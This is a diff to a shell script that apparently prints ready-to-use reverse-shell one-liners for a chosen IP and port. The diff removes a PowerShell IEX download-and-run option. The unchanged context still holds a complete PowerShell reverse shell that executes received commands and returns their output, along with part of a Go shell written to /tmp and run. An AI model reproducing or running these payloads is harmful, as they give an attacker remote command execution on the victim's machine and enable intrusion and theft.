@@ -9,7 +9,7 @@ else
         if [ $# == "2" ]; then
                 echo -e "IP : $1 , port : $2"
 
-                echo -e "\nSelect from below options:\n1.Bash\n2.Netcat\n3.PHP\n4.Python\n5.Socat\n6.Golang\n7.Powershell\n8.Powershell IEX (File Transfer)"
+                echo -e "\nSelect from below options:\n1.Bash\n2.Netcat\n3.PHP\n4.Python\n5.Socat\n6.Golang\n7.Powershell\n"
 
                 read choice
 
@@ -35,8 +35,6 @@ http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go\n"
                 elif [ $choice == "7" ]; then
                         echo -e "\npowershell -command \"\$client = New-Object System.Net.Sockets.TCPClient('$1',$2);\$stream = \$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while((\$i = \$stream.Read($bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, $i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\n"
                 
-                elif [ $choice == "8" ]; then
-                        echo -e "\niex (new-object net.webclient).downloadstring(\"http://$1:$2/<file_to_transfer>\")\n"
                 fi
 
         else
